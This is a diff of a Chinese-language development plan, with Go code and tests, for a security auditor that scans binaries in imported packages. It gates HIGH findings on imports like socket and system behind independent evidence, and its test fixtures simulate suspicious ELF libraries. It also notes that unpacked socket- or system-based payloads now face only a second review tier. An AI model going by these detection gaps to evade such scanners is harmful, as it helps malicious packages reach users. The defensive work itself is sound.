+	wantDowngrade := map[string]bool{"NET_002": true, "CMD_001": true, "BIN_002": true}
+	wantCorroborate := map[string]bool{"BIN_001": true, "PKL_001": true}
+
+	for _, id := range BinaryRuleIDs() {
+		if got := m.downgrades(id); got != wantDowngrade[id] {
+			t.Errorf("downgrades(%s) = %v, want %v", id, got, wantDowngrade[id])
+		}
+		if got := m.corroborates(id); got != wantCorroborate[id] {
+			t.Errorf("corroborates(%s) = %v, want %v", id, got, wantCorroborate[id])
+		}
+	}
+	if m.downgrades("NET_001") {
+		t.Error("downgrades(NET_001) = true: the source arm's rule is not in the binary table")
+	}
+}
+```
+
+- [ ] **Step 2: 跑测试，确认失败**
+
+```bash
+go test ./internal/codeaudit/ -run 'TestBinaryScannerDoesNotLetTwoPresenceFamilies|TestBinaryScannerKeepsAPresenceFamilyHigh|TestBinaryScannerCorroboratesAcrossArchive|TestBinaryScannerDowngradeHappensBefore|TestBinaryScannerDowngradedEvidenceDoesNot|TestBinaryFamilyClassificationIsPinned' -v 2>&1 | tail -30
+```
+
+Expected: 全部编译失败或断言失败（`DowngradeReason`、`PresenceDowngraded`、`downgrades`、`corroborates` 都还不存在）。注意：`MergeBinaryFindings` 与 `ComputeStatistics`/`ComputeConclusionContext` 已存在（Task 11 已落地），若报未定义，说明你所在的分支不是预期状态，停下来报告。
+
+- [ ] **Step 3: 实现**
+
+`rules.go`，`Finding` 结构体末尾（`BinaryOffset` 之后）：
+
+```go
+	// DowngradeReason explains why this finding is reported below the severity its
+	// rule carries in the table. It is set by a rule that gates a severity on
+	// something a single evidence line cannot show - today, the binary channel's
+	// presence families, which report HIGH only when the same file carries
+	// independent corroboration. Empty for every finding whose severity is the
+	// rule's own, so a reader can tell "the rule says LOW" from "the rule says
+	// HIGH but this file did not earn it".
+	DowngradeReason string `json:"downgrade_reason,omitempty"`
+```
+
+`binary_rules.go`，在 `binaryFamily` 定义之后加谓词，并在 `BinaryMatcher` 上加两个查询：
+
+```go
+// presenceOnly reports whether every source this family draws on is a name the
+// linker wrote. Such a family's evidence says the artifact *can* do something,
+// never that it does: the linker writes every symbol the object might reference.
+// The set is expressed over sources rather than as a list of ids so that a family
+// added later is classified by what its evidence is, not by whether someone
+// remembered to add it to a list.
+func (f *binaryFamily) presenceOnly() bool {
+	for _, s := range f.Sources {
+		if s != SourceDynsym && s != SourceNeeded {
+			return false
+		}
+	}
+	return true
+}
+
+// corroborating reports whether this family is evidence independent of the
+// file's own self-description. Only two are: a measured executable-section
+// entropy, and a committed pickle parse. Everything else either is a name
+// (dynsym, DT_NEEDED, string literals - the file says it) or a structural
+// container listing (member, notice, section), and none of those can confirm
+// another of the same kind.
+func (f *binaryFamily) corroborating() bool {
+	for _, s := range f.Sources {
+		if s != SourceEntropy && s != SourcePickle {
+			return false
+		}
+	}
+	return true
+}
+
+// downgrades reports whether a finding under this id must be withheld from HIGH
+// unless its file carries a corroborator. The severity is read from the resolved
+// rule, not from the family: the families that borrow an id own no severity, and
+// a family that resolves to MEDIUM (DYN_001) can never produce the HIGH this
+// gates.
+//
+// The lookups scan the order slice instead of using a map built in
+// NewBinaryMatcher. The matcher is constructed literally in a test, and a
+// precomputed map would silently answer "no" for it; scanning ten entries per
+// finding costs nothing.
+func (m *BinaryMatcher) downgrades(id string) bool {
+	for i := range m.order {
+		if m.order[i].ID == id {
+			return m.order[i].presenceOnly() && m.rules[i].Severity == SeverityHigh
+		}
+	}
+	return false
+}
+
+// corroborates reports whether a finding under this id is independent evidence
+// that a presence claim in the same file is real.
+func (m *BinaryMatcher) corroborates(id string) bool {
+	for i := range m.order {
+		if m.order[i].ID == id {
+			return m.order[i].corroborating()
+		}
+	}
+	return false
+}
+```
+
+同时改写表头注释：删掉 `binary_rules.go:14-21`、`CMD_001` 的 "the same undecided posture"（`:137-149`）与 `NET_002` 的 "a rule posture that was never decided"（`:178-189`）三段"未决"表述，换成已决的门控，正文用上面"背景"与"代价"两段的实测内容（`libllama-common`/`libggml-base`/`libgfortran`/`libcudart` 的导入事实、9 个库可达性 0 翻案、guest 无反汇编器、LOW 而非 MEDIUM 的原因、`BIN_002` 与"另一符号族"为何不算佐证）。**注释必须说明这次降级放走了什么**：未加壳的 `socket`/`system` 型载荷只剩 Tier-2 一道，且「没有佐证 ≠ 无害」。
+
+`binary_scanner.go`，`BinaryScanSummary` 增加字段：
+
+```go
+	// PresenceDowngraded counts findings reported below the severity their rule
+	// carries because their file held no independent corroboration. It is taken at
+	// downgrade time rather than at keep time, so it survives the finding cap
+	// spending some of them - a reader must be able to see that the channel found
+	// presence evidence and chose not to call it HIGH, even when the budget later
+	// dropped the individual findings.
+	PresenceDowngraded int `json:"presence_downgraded,omitempty"`
+```
+
+`ScanDirectory` 中 `matches := s.matcher.MatchAll(set.Lines)` 之后：
+
+```go
+		matches := s.matcher.MatchAll(set.Lines)
+		if len(matches) == 0 {
+			return nil
+		}
+
+		// Corroboration is decided per file, over every rule that matched in it,
+		// before any finding is built: a presence finding is only meaningful next to
+		// what else the file contains.
+		corroborated := false
+		for _, m := range matches {
+			if s.matcher.corroborates(m.Rule.ID) {
+				corroborated = true
+				break
+			}
+		}
+
+		res.Evidence[path] = set
+		for _, m := range matches {
+			f := binaryFinding(set, m)
+			// Before the sort and the cap below, never after: the cap's contract is
+			// written in terms of severity - it spends only what it positively knows
+			// is LOW - so a downgrade applied afterwards would leave the cap reasoning
+			// about HIGH while the report carries LOW.
+			if !corroborated && s.matcher.downgrades(m.Rule.ID) {
+				f.Severity = "LOW"
+				f.DowngradeReason = presenceDowngradeReason
+				res.Summary.PresenceDowngraded++
+			}
+			res.Findings = append(res.Findings, f)
+		}
+		return nil
+```
+
+并加常量（与包内其他面向用户的字符串一致用中文）：
+
+```go
+// presenceDowngradeReason travels with every finding the corroboration gate
+// lowered, so the report says why rather than leaving a reader to infer it from a
+// severity that does not match the rule table.
+const presenceDowngradeReason = "本文件内未发现独立佐证（没有可执行节区的高熵测量，也没有具备进程/IO/网络能力的 pickle 解析目标）：动态符号表或依赖库中的名字只说明该文件具备调用能力，不足以判定其会调用，故按 LOW 上报，交由语义分析定夺。"
+```
+
+- [ ] **Step 4: 修正被这次改动打破的三个既有截断测试**
+
+这三个测试的夹具是 `imports: {socket, connect, system, popen}` 且没有佐证，改动后四个 finding 全部变 LOW，"四个 HIGH 都不可丢"的前提不再成立：
+
+- `TestBinaryScannerCapPreservesEveryHighFinding`（`binary_scanner_test.go:248-326`）
+- `TestBinaryScannerCapKeepsLowFindingsWithinTheBudget`（`:517-554`）
+- `TestBinaryScannerCapWithNothingDroppableIsNotCapped`（`:606-637`）
+
+修法：给夹具加一个真佐证（`text: uniformBytes(512), textExec: true`），让四个 presence finding 保持 HIGH、并多出一个 `BIN_001` HIGH，然后**按新的实际数字重推**条数与 rule-id 计数——不要只改常量去凑断言。三个测试各自钉的性质必须保留：第一个钉"能阻断的 finding 无论预算都被保留"，第二个钉"预算内的 LOW 会被保留"，第三个钉"没有可丢的就不算 capped"。
+
+`binary_rules_test.go` 里 `TestBinaryFamilySeveritiesArePinned`（`:322-337`）与 `TestBinaryTableStillFiresHighOnStructuralEvidence`（`:281-287`）文字需修正：它们钉的是**解析出的规则表**（仍然 HIGH，未变），但现有措辞会让人读成"finding 会阻断"。改措辞，不改断言。
+
+- [ ] **Step 5: 跑测试，确认通过**
+
+```bash
+go test ./internal/codeaudit/ -count=1
+```
+
+Expected: `ok taa/internal/codeaudit`。整包约 50s。
+
+- [ ] **Step 6: 变异验证（本仓库已两次被"钉住错误契约"的测试背书，这一步不是可选的）**
+
+用 `go test -overlay`（**不要就地改仓库文件**）至少验证：把 `corroborates` 改成"任何第二个 HIGH 族算佐证"→ `TestBinaryScannerDoesNotLetTwoPresenceFamiliesCorroborateEachOther` 必须变红；把降级挪到 sort/cap 之后 → `TestBinaryScannerDowngradeHappensBeforeTheCap` 必须变红；把级别写成 MEDIUM → `TestBinaryScannerDowngradedEvidenceDoesNotBlockUnderEitherPolicy` 的 gate 断言必须变红；去掉佐证判定、无条件降级 → `TestBinaryScannerKeepsAPresenceFamilyHighWhenTheFileIsPacked` 必须变红；把 `presenceOnly` 写成"Sources 含 SourceDynsym"（而不是"⊆ {Dynsym, Needed}"）→ `TestBinaryFamilyClassificationIsPinned` 必须变红。报告逐条结果，并如实报告哪条变异**没有**被抓到。
+
+- [ ] **Step 7: 提交**
+
+```bash
+gofmt -l internal/codeaudit/   # 基线：audit.go / llm.go / result_checker.go 本就未格式化；绝不要 gofmt -w
+go vet ./internal/codeaudit/
+git add internal/codeaudit/rules.go internal/codeaudit/binary_rules.go internal/codeaudit/binary_scanner.go internal/codeaudit/binary_scanner_test.go internal/codeaudit/binary_rules_test.go
+git commit -m "fix(audit): gate binary HIGH on independent corroboration"
+```
 
 ### Task 12: 接入 `GenerateAuditReport` 与报告元数据
 
 **Files:**
-- Modify: `internal/codeaudit/verifier.go`, `internal/codeaudit/audit.go`, `internal/codeaudit/llm_test.go`, `internal/controller/import_processing.go`
+- Modify: `internal/codeaudit/verifier.go`, `internal/codeaudit/audit.go`, `internal/controller/import_processing.go`
 - Modify (机械更新调用点): `internal/codeaudit/audit_test.go`, `internal/codeaudit/llm_absence_test.go`, `internal/codeaudit/engine_select_test.go`
 - Test: `internal/codeaudit/engine_select_test.go`（新增用例）
 
@@ -4211,7 +9389,16 @@ git commit -m "feat(audit): merge binary findings into the audit report"
 func TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine(t *testing.T) {
 	engines := map[string]StaticEngine{}
 	for _, name := range []string{EngineNameRegex, EngineNameSemgrep} {
-		engine, err := NewEngine(EngineConfig{Name: name, SemgrepRulesPath: DefaultSemgrepRulesPath})
+		// repoSemgrepRules(t), not DefaultSemgrepRulesPath: the latter is a path
+		// relative to the repository root, and NewEngine stats it with the
+		// process's working directory, which under `go test` is this package's
+		// directory - so the bare default resolves to
+		// internal/codeaudit/models/audit/... and NewEngine fails before any
+		// subtest starts, where a skip inside the subtest could not save it. The
+		// helper makes it absolute; the per-engine skip below is still needed for
+		// a host without the CLI. The regex arm ignores the field, so one value
+		// serves both.
+		engine, err := NewEngine(EngineConfig{Name: name, SemgrepRulesPath: repoSemgrepRules(t)})
 		if err != nil {
 			t.Fatalf("NewEngine(%s): %v", name, err)
 		}
@@ -4221,9 +9408,18 @@ func TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine(t *testing.T) {
 	for name, engine := range engines {
 		t.Run(name, func(t *testing.T) {
 			dir := t.TempDir()
+			// The packed section is not decoration: Task 11b's corroboration gate
+			// downgrades a presence-only family (NET_002, from the socket/connect
+			// imports) to LOW unless the same file carries independent corroboration,
+			// so a fixture that imported socket without a near-random executable
+			// section would pass under assist and this assertion could not hold. The
+			// measured entropy is what makes the package block on evidence rather than
+			// on a name.
 			writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
-				imports: []string{"socket", "connect"},
-				needed:  []string{"libcurl.so.4"},
+				imports:  []string{"socket", "connect"},
+				needed:   []string{"libcurl.so.4"},
+				text:     uniformBytes(512),
+				textExec: true,
 			}))
 
 			cfg := AuditConfig{
@@ -4280,9 +9476,41 @@ func TestGenerateAuditReportWithBinaryDisabledIsUnchanged(t *testing.T) {
 		t.Error("Passed = false with the channel disabled; the disabled path is not a rollback")
 	}
 }
+
+// TestGenerateAuditReportMirrorsBinaryGapsIntoMetadata pins that the metadata
+// mirror carries the gap fields and not just the counts. The scan summary is
+// what makes a blocked import explainable from the report that leaves the
+// process, and a copy that kept only FilesCount would read as a channel that
+// finished on a package whose native code it never examined. The fixture fails
+// after classify - the header parses, the section header table runs off the end
+// - so the gap is Incomplete rather than a skipped file, which is exactly the
+// shape the host's truncated CUDA libraries have.
+func TestGenerateAuditReportMirrorsBinaryGapsIntoMetadata(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{text: []byte("truncated")})
+	// e_shoff past the end of the file (ELF64 header offset 0x28).
+	binary.LittleEndian.PutUint64(raw[0x28:0x30], 1<<30)
+	writeTestBytes(t, dir, "truncated.so", raw)
+
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(),
+		AuditConfig{LLM: LLMConfig{Enabled: false, Policy: "assist"}, Binary: DefaultBinaryConfig()}, nil)
+	if err != nil {
+		t.Fatalf("GenerateAuditReport: %v", err)
+	}
+	if audit.ScanMetadata.Binary == nil {
+		t.Fatal("ScanMetadata.Binary is nil: the binary channel did not run")
+	}
+	if audit.ScanMetadata.Binary.Incomplete != 1 {
+		t.Errorf("ScanMetadata.Binary.Incomplete = %d, want 1: the mirror must carry the gap, not only the counts",
+			audit.ScanMetadata.Binary.Incomplete)
+	}
+	if audit.Conclusion.Passed {
+		t.Error("Passed = true for a package whose native code could not be examined")
+	}
+}
 ```
 
-> 注：semgrep 用例在未安装 semgrep CLI 的环境会失败。在 `internal/codeaudit/engine_select_test.go` 的 import 块补 `"os/exec"`，并在子测试开头加：
+> 注：两步都要有，缺一不可。**构造引擎时**必须传 `repoSemgrepRules(t)`（`semgrep_engine_test.go:558-568` 的 helper），不能传裸的 `DefaultSemgrepRulesPath`——后者是相对路径，`NewEngine` 会以包目录为 cwd 去 stat，`internal/codeaudit/models/audit/...` 必然 MISSING，`NewEngine` 在进入任何 subtest **之前**就返回错误，subtest 里的 skip 救不了。仓库既有用例（`engine_select_test.go:30`/`:203`/`:249`）也一律这么写。**然后是**：semgrep 用例在未安装 semgrep CLI 的环境要 skip。在 `internal/codeaudit/engine_select_test.go` 的 import 块补 `"os/exec"`（`TestGenerateAuditReportMirrorsBinaryGapsIntoMetadata` 还要用 `binary.LittleEndian` 改夹具头，所以**同一个 import 块里还要补 `"encoding/binary"`**——该文件今天的 import 块是 `context`/`os`/`path/filepath`/`strings`/`testing`/`time`，两者都不在里面），并在子测试开头加：
 
 ```go
 			if name == EngineNameSemgrep {
@@ -4319,14 +9547,9 @@ type AuditConfig struct {
 	// byte-identical to the one produced before the channel existed.
 	Binary BinaryConfig
 }
-
-// DefaultAuditConfig returns the configuration a caller that has nothing to say
-// gets: the LLM as configured by DefaultLLMConfig, the binary channel on with
-// its default limits.
-func DefaultAuditConfig() AuditConfig {
-	return AuditConfig{LLM: DefaultLLMConfig(), Binary: DefaultBinaryConfig()}
-}
 ```
+
+> 这里**不**提供 `DefaultAuditConfig()`：全计划没有任何调用点会用它（每个调用点都显式构造 `AuditConfig{...}`），而本仓库带 deadcode 闸门，一个没人调用的导出函数会被它标出来。需要默认值时，`DefaultLLMConfig()` 与 `DefaultBinaryConfig()` 各自可用。
 
 修改 `GenerateAuditReport` 的签名与函数体：
 
@@ -4352,13 +9575,14 @@ func GenerateAuditReport(ctx context.Context, dir string, engine StaticEngine, c
 	// LLM phases so that the findings it produces are adjudicated by the same
 	// verifier, in the same pass, as the source findings - a separate pass would
 	// need a second quota and a second failure mode.
-	binaryRes, err := runBinaryChannel(dir, cfg.Binary)
-	if err != nil {
-		// The binary channel's failure is a failure of the audit. Continuing
-		// would report a verdict reached without it, and under fail-closed that
-		// is the silent allow the policy exists to prevent.
-		return nil, fmt.Errorf("binary scan: %w", err)
-	}
+	//
+	// It returns no error, and that is the point rather than an oversight: see
+	// runBinaryChannel. A binary-channel failure is a gap the report records and
+	// ProvesCleanScan refuses on, not a second way for the audit to return an
+	// error - the caller turns any error into a refusal that skips the report
+	// (internal/controller/import_processing.go:642-660), which is the outcome
+	// this channel exists to make accurate rather than to make easy.
+	binaryRes := runBinaryChannel(dir, cfg.Binary)
 
 	// Phase 1c: merge.
 	if binaryRes != nil {
@@ -4418,17 +9642,47 @@ func GenerateAuditReport(ctx context.Context, dir string, engine StaticEngine, c
 // an empty result would be indistinguishable from a pass that examined a package
 // with no binary files in it, and the report's metadata would then claim a
 // channel ran that never did.
-func runBinaryChannel(dir string, binCfg BinaryConfig) (*BinaryScanResult, error) {
+//
+// It deliberately returns no error, and the reason is the caller's failure path
+// rather than this function's convenience. GenerateAuditReport's caller turns any
+// error into a refusal that skips the report entirely (Task 11a removed the
+// package deletion that used to be here; what remains is that the audit returns
+// before any report exists), so an error returned here decides the import before
+// the report it belongs to exists - with nothing recorded about which file, or which channel, or why. A
+// per-file failure is already the scanner's own business: it is counted as
+// Incomplete and withholds the pass through ProvesCleanScan. A whole-pass failure
+// is recorded the same way, as Errored, so the verdict is the one the report
+// computes and the reason travels in scan_metadata.binary rather than in a log
+// line the report never reaches.
+func runBinaryChannel(dir string, binCfg BinaryConfig) *BinaryScanResult {
 	if !binCfg.Enabled {
-		return nil, nil
+		return nil
 	}
 	matcher, err := NewBinaryMatcher()
 	if err != nil {
-		return nil, err
+		log.Printf("binary channel: matcher build failed, pass withheld: %v", err)
+		return &BinaryScanResult{Summary: BinaryScanSummary{Errored: true}}
 	}
-	return NewBinaryScanner(matcher, binCfg).ScanDirectory(dir)
+	res, err := NewBinaryScanner(matcher, binCfg).ScanDirectory(dir)
+	if err != nil {
+		log.Printf("binary channel: scan failed, pass withheld: %v", err)
+		return &BinaryScanResult{Summary: BinaryScanSummary{Errored: true}}
+	}
+	return res
 }
 ```
+
+修改 `internal/codeaudit/verifier.go` 里还有一处**必须在本任务落地**，否则上面的 `GenerateAuditReport` 编译不过：`analyzeFileWithLLM` 的形参表末尾要加一个 `binaryEvidence map[string]*EvidenceSet`，凑成六参。
+
+```go
+func analyzeFileWithLLM(ctx context.Context, client LLMClient, filePath string, findings []Finding, lineCounts map[string]int, binaryEvidence map[string]*EvidenceSet) FileSummary {
+```
+
+**调用点**：`analyzeFileWithLLM` 全仓只有一个调用点——`internal/codeaudit/verifier.go:385`，就在 `GenerateAuditReport` 的 Phase 3 循环里，也就是本步骤刚重写的那段代码，它已经传了六个实参。除此之外没有别的调用点（`grep -rn 'analyzeFileWithLLM' --include=*.go internal` 只回定义 `verifier.go:401` 与这一处调用），所以这一处改完，签名即闭合。参数在本任务里暂时不被读——Go 不报未使用的形参，`go vet` 也不报——二进制分支的**函数体**由 Task 13 填进去；签名归这里，是因为调用它的第一个任务是这里。
+
+> `Finding.Line` 对二进制 finding 是**证据清单的下标，不是源码行号**（见 Task 9 的 `binaryFinding`），而它会随 `VerifyReport` 走进模型：`VerifyReport` 用 `teellm.CodeTarget{FilePath: f.File, Line: f.Line, CodeSnippet: f.CodeSnippet, ContextBefore: ..., ContextAfter: ...}`（`internal/codeaudit/verifier.go:63-69`）组装 payload，二进制 finding 与源码 finding 走的是同一条组装路径。没有消费者因此出错——`BuildFileReport` 与 `GroupFindingsByFile` 都不读 `Line`，二进制文件也在 `ReadFileForAnalysis` 之前就走完二进制分支——但模型拿到的是一个含义不同的数字，所以二进制 prompt 必须把「每一行是一条证据，格式为『序号 [来源] 内容』」讲清楚（Task 13），让那个数字在模型眼里就是证据行号。逐字改这一句的意思：这是**载荷里一个字段的含义差异**，不是消费者会崩的 bug。
+
+> 合并之后还有第二道闸门要说清：`VerifyReport` 自己按 `LLMConfig.MaxFindings` 给逐条裁定封顶（`internal/codeaudit/verifier.go:26-29`），所以那个上限现在作用在**合并后的清单**上。它按 `sortFindings` 的 (`File`, `Line`, `RuleID`) 顺序保留前 N 条，于是「先裁谁」由路径拼写决定而不是由通道决定——一旦这个值非零，排在后面的 finding（二进制文件往往不在字典序前头）就会**不被裁定**，而清单里没有任何东西说明这一点。生产配置把它设成 0（「0 means no cap」，`internal/app/taa/app.go:676-679`），所以今天它是惰性的；写在这里是因为将来有人把它调成非零，丢掉的正是二进制那条臂，而故障是静默的。
 
 - [ ] **Step 4: 让 `AssembleAuditReport` 抄二进制元数据**
 
@@ -4450,6 +9704,8 @@ func runBinaryChannel(dir string, binCfg BinaryConfig) (*BinaryScanResult, error
 ```
 
 > `AssembleAuditReport` 的签名**不变**：二进制摘要搭 `Report.Binary` 的车，与 `Engine`、`Truncated` 等字段走同一条路。少改 10 个调用点，也少一处两路并行的可能。
+
+> **这一步的硬要求：镜像必须携带 `Incomplete`/`BoundedExecutable`/`Errored` 这三个缺口字段，不能只带计数。** 理由是承重的，不是风格问题：二进制不完整性会**独自扣包**（`audit.go:354` 的 `sp := scanReport.Passed && scanReport.ProvesCleanScan()`，而 `ProvesCleanScan` 在 `BoundedExecutable > 0 || Incomplete > 0 || Errored` 时返回 false），所以包被扣下之后，报告里必须能读出**哪个缺口字段**扣的它。这三个字段正是那个判定的全部输入；把它们换成一个 `files_count` 之类的数，或者只抄 `FilesCount`，就等于把"有一份原生代码没看完"和"全都看完了"在报告里写成同一句话——`failclosed_test.go:155` 那条"元数据存在就是为了说明是否跑完"的先例一破，operator 就只能看到导入被拒、看不到为什么。抄的是**同一个 summary 的指针**（`Binary: scanReport.Binary`），所以这一条在实现上是自然的；它要防的是后来者"顺手把它摊平成几个计数字段"，或者只挑其中一个抄。**钉住它的测试是 `TestGenerateAuditReportMirrorsBinaryGapsIntoMetadata`**（Step 1）：夹具让 `elf.NewFile` 在一个已分类为 ELF 的文件上失败，于是 summary 里 `Incomplete = 1`，断言这个 1 一路走到 `audit.ScanMetadata.Binary.Incomplete`，并且结论是 `Passed == false`。零值陷阱也在这条要求里：**只有真正走完的 pass 才能挂非 nil summary**（`Report.Binary` 的折入只对非 nil 生效，一个非 nil 的零值 summary 会被读成 clean），所以 `runBinaryChannel` 之外不得有人构造它。
 
 - [ ] **Step 5: 机械更新全部调用点**
 
@@ -4474,8 +9730,8 @@ grep -rn "GenerateAuditReport(" --include=*.go internal | grep -v "func Generate
 ```go
 	if audit.ScanMetadata.Binary != nil {
 		b := audit.ScanMetadata.Binary
-		s.Logs.Add(LogInfo, "audit", "二进制审计: files=%d kinds=%v boundedExecutable=%d boundedData=%d incomplete=%d truncated=%v",
-			b.FilesCount, b.Kinds, b.BoundedExecutable, b.BoundedData, b.Incomplete, b.Truncated)
+		s.Logs.Add(LogInfo, "audit", "二进制审计: files=%d kinds=%v boundedExecutable=%d boundedData=%d incomplete=%d errored=%v findingsCapped=%v findingsDropped=%d",
+			b.FilesCount, b.Kinds, b.BoundedExecutable, b.BoundedData, b.Incomplete, b.Errored, b.FindingsCapped, b.FindingsDropped)
 	}
 ```
 
@@ -4505,7 +9761,26 @@ git commit -m "feat(audit): run the binary channel inside GenerateAuditReport fo
 - Modify: `internal/codeaudit/verifier.go`, `internal/codeaudit/llm_test.go`
 - Test: `internal/codeaudit/llm_test.go`
 
-- [ ] **Step 1: 让 mock 捕获 prompt**
+- [ ] **Step 1: 在 `llm_test.go` 的 import 块补 `"strings"`**
+
+本任务的两个新用例都用 `strings.Contains` 断言 prompt 的内容，而 `internal/codeaudit/llm_test.go` 的 import 块（`:3-13`）当前只有 `context`、`encoding/json`、`net/http`、`net/http/httptest`、`testing`、`time` 以及 `github.com/CipherSlinger/teellm`、`github.com/CipherSlinger/teetls`，**没有 `"strings"`**。漏补的后果不是"测试变红"而是**编译不过**：Step 4 会报 `undefined: strings`（不是那儿写的"prompt 里是 Python 框架与原始字节"），Step 7 的 `go vet ./internal/codeaudit/` 也一样挂。Go 拒绝未使用的 import，所以这一条必须和真正用到它的用例在同一步落地——这正是它被排在最前的原因：
+
+```go
+import (
+	"context"
+	"encoding/json"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/CipherSlinger/teellm"
+	"github.com/CipherSlinger/teetls"
+)
+```
+
+- [ ] **Step 2: 让 mock 捕获 prompt**
 
 修改 `internal/codeaudit/llm_test.go` 的 `mockLLMClient`：结构体加一个字段
 
@@ -4529,7 +9804,7 @@ func (m *mockLLMClient) AnalyzeFile(_ context.Context, prompt string) (FileSumma
 }
 ```
 
-- [ ] **Step 2: 写失败测试**
+- [ ] **Step 3: 写失败测试**
 
 追加到 `internal/codeaudit/llm_test.go`：
 
@@ -4597,15 +9872,15 @@ func TestSourceFilePromptIsUnchangedByTheBinaryChannel(t *testing.T) {
 }
 ```
 
-- [ ] **Step 3: 跑测试确认失败**
+- [ ] **Step 4: 跑测试确认失败**
 
 ```bash
 go test ./internal/codeaudit/ -run 'TestBinaryFilePrompt|TestSourceFilePrompt' 2>&1 | head -20
 ```
 
-预期：`TestBinaryFilePromptCarriesEvidenceAndNotRawBytes` FAIL（prompt 里是 Python 框架与原始字节）。
+预期：`TestBinaryFilePromptCarriesEvidenceAndNotRawBytes` FAIL（prompt 里是 Python 框架与原始字节）。注意这里的前提是 Step 1 已经补过 `"strings"`——没补的话这一步会以 `undefined: strings` 编译失败，那是**另一种**红，别把它当成"预期内的失败"。
 
-- [ ] **Step 4: 实现**
+- [ ] **Step 5: 实现**
 
 修改 `internal/codeaudit/verifier.go`。
 
@@ -4656,7 +9931,7 @@ const binaryFileAnalysisPromptTemplate = `你是二进制代码安全审计专�
 {"risk_level":"HIGH/MEDIUM/LOW","summary":"一句话安全结论(中文)","chained":false,"exfiltration":false}`
 ```
 
-修改 `analyzeFileWithLLM`：
+修改 `analyzeFileWithLLM`：签名已在 Task 12 扩到六参（末尾的 `binaryEvidence map[string]*EvidenceSet`），本步骤只把二进制分支填进去——`binaryEvidence` 里查到本文件就走二进制 prompt，否则维持源码路径不变：
 
 ```go
 // analyzeFileWithLLM calls the LLM for a file-level security summary.
@@ -4666,6 +9941,18 @@ const binaryFileAnalysisPromptTemplate = `你是二进制代码安全审计专�
 // of the file. The listing is used rather than re-read from disk for two
 // reasons: a binary file read as text is noise, and re-running the extraction
 // here would read a possibly-large file a second time on the import path.
+//
+// Both branches are behind the FileAnalyzer assertion above, and the binary one
+// is reachable today only through a client that implements that interface. The
+// production client does not: it is teellm.Client (LLMClient above), whose
+// interface declares VerifyFinding, HealthCheck and Close and no AnalyzeFile,
+// and newLLMClient returns that value unchanged. The only AnalyzeFile
+// implementation in the tree is a test mock. So in production a binary file
+// falls through to synthesizeFileSummary - which is the same situation the
+// source file path has been in all along, so this is not a regression the
+// binary channel introduces; the file-level prompt is exercised by the mock
+// rather than by the deployed pipeline. This function does not change that, and
+// its tests do not claim otherwise.
 func analyzeFileWithLLM(ctx context.Context, client LLMClient, filePath string, findings []Finding, lineCounts map[string]int, binaryEvidence map[string]*EvidenceSet) FileSummary {
 	fa, ok := client.(FileAnalyzer)
 	if !ok {
@@ -4703,10 +9990,9 @@ func analyzeFileWithLLM(ctx context.Context, client LLMClient, filePath string, 
 }
 
 // binaryFilePromptMaxLines bounds the listing handed to the model. It is a
-// separate number from the source prompt's 80 lines because an evidence line is
-// a few dozen bytes where a source line is a few dozen characters, and because
-// the ordering puts the structural evidence - the part a judgement needs most -
-// at the front of the listing.
+// separate number from the source prompt's 80 lines because the budget has to
+// hold every reserved structural line plus a useful number of imports at the
+// measured densities (a real C++ library has hundreds).
 const binaryFilePromptMaxLines = 120
 
 // analyzeBinaryFileWithLLM asks the model about a file the binary channel read.
@@ -4714,7 +10000,7 @@ func analyzeBinaryFileWithLLM(ctx context.Context, fa FileAnalyzer, ev *Evidence
 	prompt := fmt.Sprintf(binaryFileAnalysisPromptTemplate,
 		filepath.Base(ev.File), ev.Kind, ev.Size, len(ev.Lines),
 		len(findings), BuildFindingsSummary(findings),
-		ev.Render(binaryFilePromptMaxLines),
+		ev.RenderExcerpt(binaryFilePromptMaxLines),
 	)
 
 	result, err := fa.AnalyzeFile(ctx, prompt)
@@ -4729,7 +10015,24 @@ func analyzeBinaryFileWithLLM(ctx context.Context, fa FileAnalyzer, ev *Evidence
 }
 ```
 
-- [ ] **Step 5: 跑测试确认通过**
+> **注（诚实性，必须按事实写，不改行为）**：上面的二进制分支今天**只被 mock 驱动，不是线上行为**。生产的 `LLMClient` 就是 `teellm.Client`（`internal/codeaudit/llm.go:70`），它的接口只声明 `VerifyFinding`/`HealthCheck`/`Close`（`teellm/client.go:56-60`），**没有** `AnalyzeFile`；`newLLMClient` 把这个接口值原样返回（`internal/controller/import_processing.go:742-753`）。全树唯一的 `AnalyzeFile` 实现者是测试 mock（`internal/codeaudit/llm_test.go:86`），`teellm.ActionAnalyzeFile`（`teellm/types.go:9`）无消费方，`parseFileSummary` 也只被测试调用。所以二进制文件在生产里落到 `synthesizeFileSummary`，**与源码文件路径的既有处境完全相同**——文件级提示词由 mock 驱动，不由线上流水线驱动，本任务不改变这一点，本任务的两个用例也不声称改变了它。**不要**照着"A file the binary channel examined takes the binary prompt…"这种前提去写注释或写断言，那是生产里不成立的说法；上面 `analyzeFileWithLLM` 的注释已按事实改过。
+>
+> **已决（2026-10-12，用户裁定）：保持现状并写明，不给生产路径补适配器。** 决策前实测到的约束，逐条记在这里以免后来者重新走一遍：
+> - 生产 `LLMClient` 是 `teellm.Client` 的**类型别名**（`internal/codeaudit/llm.go:71`），而 `teellm.Client` 只有一个端点 `/v1/verify`（`teellm/client.go:149`），收的是 `RequestEnvelope`。该结构**没有任何承载提示词的字段**——内容槽只有 `FindingPayload`（`teellm/types.go:78-90`）。所以"补一层实现 `AnalyzeFile` 的适配器"在现有协议下**写不出来**：没有地方放 `prompt`。
+> - `teellm.ActionAnalyzeFile`（`teellm/types.go:9`）在全仓**无任何消费方**：客户端不发、服务端（`ollama_backend.go`）不处理，服务只认 `VERIFY_FINDING`。它是个声明过的死常量。
+> - 因此另两条路各自的代价是：**映射到 `VERIFY_FINDING`**（把证据清单塞进合成的 `FindingPayload.CodeTarget.CodeSnippet`）无需改协议，但服务会按 finding 级准则作答、返回 `DecisionResult`，拿不到文件级要求的 `chained`/`exfiltration` 两个字段，且等于向服务谎报"这是一条 finding"；**扩协议**（`RequestEnvelope` 加提示词槽 + 服务端实现 `ANALYZE_FILE`）语义正确、字段完整，但要改 `teellm` **子模块（另一个仓库）** 并重建服务镜像，是本计划之外的一次独立改动。两条都被否。
